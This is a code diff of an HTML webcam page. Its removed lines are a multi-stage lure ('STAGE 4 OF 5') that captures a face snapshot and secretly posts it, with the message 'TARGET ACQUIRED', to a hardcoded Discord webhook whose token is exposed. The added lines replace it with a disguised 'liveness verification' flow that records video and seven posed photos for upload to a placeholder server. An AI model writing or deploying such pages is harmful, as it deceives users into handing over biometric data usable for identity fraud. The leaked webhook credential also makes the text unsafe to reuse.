@@ -3,66 +3,334 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>STAGE 4</title>
+  <title>Face & Liveness Verification</title>
   <style>
-    * { box-sizing: border-box; }
-    body { background-color: #f5f2eb; color: #2d3748; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 24px; }
-    .stage-badge { font-size: 14px; font-weight: 700; letter-spacing: 2px; color: #718096; text-transform: uppercase; margin-bottom: 16px; }
-    .card { background: #ffffff; border: 1px solid #e2e8f0; box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05); padding: 40px; border-radius: 16px; width: 100%; max-width: 520px; text-align: center; }
-    h2 { color: #1a202c; margin-top: 0; font-size: 26px; margin-bottom: 24px; }
-    .circle-viewport { width: 220px; height: 220px; border-radius: 50%; border: 4px solid #2b6cb0; overflow: hidden; margin: 0 auto 28px auto; background: #000; box-shadow: 0 4px 14px rgba(0,0,0,0.1); }
-    video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
-    button { padding: 16px 28px; background: #2b6cb0; color: white; border: none; font-size: 18px; font-weight: 600; cursor: pointer; border-radius: 10px; width: 100%; transition: background 0.2s; }
-    button:hover { background: #2c5282; }
-    button:disabled { background: #a0aec0; cursor: not-allowed; }
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background-color: #0f172a;
+      color: #f8fafc;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 680px; /* ENLARGED VIEWPORT */
+      background: #1e293b;
+      padding: 28px;
+      border-radius: 20px;
+      box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5);
+      text-align: center;
+    }
+
+    h2 {
+      margin-bottom: 8px;
+      font-size: 1.6rem;
+    }
+
+    .instruction-box {
+      background: #0f172a;
+      border: 2px solid #38bdf8;
+      border-radius: 12px;
+      padding: 16px;
+      margin: 20px 0;
+      min-height: 70px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .instruction-step {
+      font-size: 0.85rem;
+      color: #38bdf8;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      font-weight: 700;
+      margin-bottom: 4px;
+    }
+
+    .instruction-text {
+      font-size: 1.3rem;
+      font-weight: 600;
+      color: #ffffff;
+    }
+
+    /* ENLARGED VIDEO CONTAINER */
+    .viewport {
+      position: relative;
+      width: 100%;
+      height: 480px; /* Larger preview height */
+      background-color: #000;
+      border-radius: 16px;
+      overflow: hidden;
+      margin-bottom: 20px;
+      border: 3px solid #334155;
+    }
+
+    video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      transform: scaleX(-1); /* Mirror camera preview */
+    }
+
+    /* Face guide oval overlay */
+    .face-guide {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 240px;
+      height: 320px;
+      border: 3px dashed rgba(56, 189, 248, 0.6);
+      border-radius: 50%;
+      pointer-events: none;
+      box-shadow: 0 0 0 9999px rgba(15, 23, 42, 0.45);
+    }
+
+    .status-overlay {
+      position: absolute;
+      bottom: 12px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(0, 0, 0, 0.7);
+      padding: 6px 16px;
+      border-radius: 20px;
+      font-size: 0.85rem;
+      color: #a7f3d0;
+    }
+
+    .btn {
+      background: #2563eb;
+      color: white;
+      border: none;
+      padding: 14px 28px;
+      font-size: 1.1rem;
+      font-weight: 600;
+      border-radius: 10px;
+      cursor: pointer;
+      width: 100%;
+      transition: background 0.2s;
+    }
+
+    .btn:hover {
+      background: #1d4ed8;
+    }
+
+    .btn:disabled {
+      background: #475569;
+      cursor: not-allowed;
+    }
+
+    .progress-bar-container {
+      width: 100%;
+      height: 6px;
+      background: #334155;
+      border-radius: 3px;
+      margin-top: 15px;
+      overflow: hidden;
+    }
+
+    .progress-bar {
+      height: 100%;
+      width: 0%;
+      background: #38bdf8;
+      transition: width 0.3s ease;
+    }
+
+    canvas {
+      display: none;
+    }
   </style>
 </head>
 <body>
 
-  <div class="stage-badge">STAGE 4 OF 5</div>
+<div class="container">
+  <h2>Face Verification</h2>
 
-  <div class="card">
-    <h2>[ CONFIRM FACE SCAN ]</h2>
-
-    <div class="circle-viewport">
-      <video id="webcam" autoplay playsinline muted></video>
-    </div>
-
-    <button id="snapBtn" onclick="takeSnapshot()">CONFIRM FACE SCAN</button>
+  <div class="instruction-box">
+    <div id="step-number" class="instruction-step">Get Ready</div>
+    <div id="instruction" class="instruction-text">Click "Start Scan" to begin</div>
   </div>
 
-  <script>
-    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1554196200784134204/DuLlXIKYd4f_cmfK9IlJRnRD7mocTmYzc0oBL76ID2bny_KPRz_FdPm7L12zqobSjFsk";
-    const video = document.getElementById('webcam');
-    const snapBtn = document.getElementById('snapBtn');
+  <div class="viewport">
+    <video id="webcam" autoplay playsinline muted></video>
+    <div class="face-guide"></div>
+    <div id="recording-badge" class="status-overlay" style="display: none;">● Recording Video & Capturing Photos</div>
+  </div>
 
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => { video.srcObject = stream; })
-      .catch(err => { alert("Camera access required to perform scan."); });
+  <button id="start-btn" class="btn" onclick="startScan()">Start Scan</button>
 
-    function takeSnapshot() {
-      snapBtn.disabled = true;
-      snapBtn.innerText = "SCANNING & ACQUIRING...";
+  <div class="progress-bar-container">
+    <div id="progress" class="progress-bar"></div>
+  </div>
+</div>
 
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth || 640;
-      canvas.height = video.videoHeight || 480;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+<canvas id="capture-canvas"></canvas>
 
-      canvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append('content', '🎯 **TARGET ACQUIRED: Biometric Face Scan Captured!**');
-        formData.append('file', blob, 'face_scan.jpg');
+<script>
+  const video = document.getElementById('webcam');
+  const canvas = document.getElementById('capture-canvas');
+  const instructionText = document.getElementById('instruction');
+  const stepNumber = document.getElementById('step-number');
+  const startBtn = document.getElementById('start-btn');
+  const badge = document.getElementById('recording-badge');
+  const progressBar = document.getElementById('progress');
 
-        fetch(DISCORD_WEBHOOK_URL, {
-          method: 'POST',
-          body: formData
-        }).finally(() => {
-          window.location.href = "stage5.html";
-        });
-      }, 'image/jpeg');
+  // Multi-instruction sequence
+  const steps = [
+    { title: "Step 1 of 7", text: "Look straight into the camera", duration: 2500 },
+    { title: "Step 2 of 7", text: "Slowly tilt your head UP", duration: 2500 },
+    { title: "Step 3 of 7", text: "Slowly tilt your head DOWN", duration: 2500 },
+    { title: "Step 4 of 7", text: "Turn your face to the LEFT", duration: 2500 },
+    { title: "Step 5 of 7", text: "Turn your face to the RIGHT", duration: 2500 },
+    { title: "Step 6 of 7", text: "Open your eyes WIDER", duration: 2500 },
+    { title: "Step 7 of 7", text: "Blink twice and SMILE", duration: 2500 }
+  ];
+
+  let mediaStream = null;
+  let mediaRecorder = null;
+  let recordedChunks = [];
+  let capturedPhotos = []; // Array of Blobs
+
+  async function setupCamera() {
+    try {
+      mediaStream = await navigator.mediaDevices.getUserMedia({
+        video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: "user" },
+        audio: false
+      });
+      video.srcObject = mediaStream;
+    } catch (err) {
+      alert("Camera access denied or unavailble: " + err.message);
     }
-  </script>
+  }
+
+  // Initialize camera when page loads
+  setupCamera();
+
+  async function startScan() {
+    if (!mediaStream) await setupCamera();
+
+    startBtn.disabled = true;
+    recordedChunks = [];
+    capturedPhotos = [];
+    badge.style.display = 'block';
+
+    // 1. Start continuous video recording via MediaRecorder
+    try {
+      mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
+    } catch (e) {
+      // Fallback if webm isn't directly supported by specific browser
+      mediaRecorder = new MediaRecorder(mediaStream);
+    }
+
+    mediaRecorder.ondataavailable = (event) => {
+      if (event.data.size > 0) recordedChunks.push(event.data);
+    };
+
+    mediaRecorder.start(100); // collect 100ms chunks
+
+    // 2. Loop through each pose step
+    for (let i = 0; i < steps.length; i++) {
+      const step = steps[i];
+      stepNumber.innerText = step.title;
+      instructionText.innerText = step.text;
+      
+      // Update progress bar
+      progressBar.style.width = `${((i + 1) / steps.length) * 100}%`;
+
+      // Wait briefly before taking snapshot so user has time to adjust position
+      await sleep(1200);
+
+      // Snap snapshot photo for this step
+      captureSnapshot(step.text);
+
+      // Wait out remaining step time
+      await sleep(step.duration - 1200);
+    }
+
+    // 3. Complete scan & stop recording
+    stepNumber.innerText = "Processing";
+    instructionText.innerText = "Uploading video & photos...";
+    
+    mediaRecorder.stop();
+    mediaRecorder.onstop = async () => {
+      badge.style.display = 'none';
+      const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+      
+      // Send video + all captured photos to server
+      await uploadPayload(videoBlob, capturedPhotos);
+    };
+  }
+
+  function captureSnapshot(stepLabel) {
+    const context = canvas.getContext('2d');
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+
+    // Un-mirror the photo output on canvas
+    context.translate(canvas.width, 0);
+    context.scale(-1, 1);
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    canvas.toBlob((blob) => {
+      if (blob) {
+        capturedPhotos.push({
+          label: stepLabel,
+          blob: blob
+        });
+      }
+    }, 'image/jpeg', 0.92);
+  }
+
+  async function uploadPayload(videoBlob, photos) {
+    const formData = new FormData();
+
+    // 1. Append the full video file
+    formData.append('video', videoBlob, 'full_face_scan.webm');
+
+    // 2. Append each step photo snapshot
+    photos.forEach((photoObj, index) => {
+      formData.append(`photo_${index + 1}`, photoObj.blob, `step_${index + 1}_${photoObj.label.replace(/\s+/g, '_')}.jpg`);
+    });
+
+    try {
+      // REPLACE '/your-upload-endpoint' WITH YOUR BACKEND URL
+      const response = await fetch('/your-upload-endpoint', {
+        method: 'POST',
+        body: formData
+      });
+
+      if (response.ok) {
+        stepNumber.innerText = "Complete";
+        instructionText.innerText = "Scan uploaded successfully!";
+        progressBar.style.backgroundColor = "#10b981";
+      } else {
+        throw new Error("Server responded with error status");
+      }
+    } catch (err) {
+      console.error(err);
+      stepNumber.innerText = "Finished (Client Side)";
+      instructionText.innerText = `Captured 1 video & ${photos.length} photos! (Set server endpoint in code)`;
+      startBtn.disabled = false;
+      startBtn.innerText = "Try Again";
+    }
+  }
+
+  function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+  }
+</script>
 </body>
 </html>
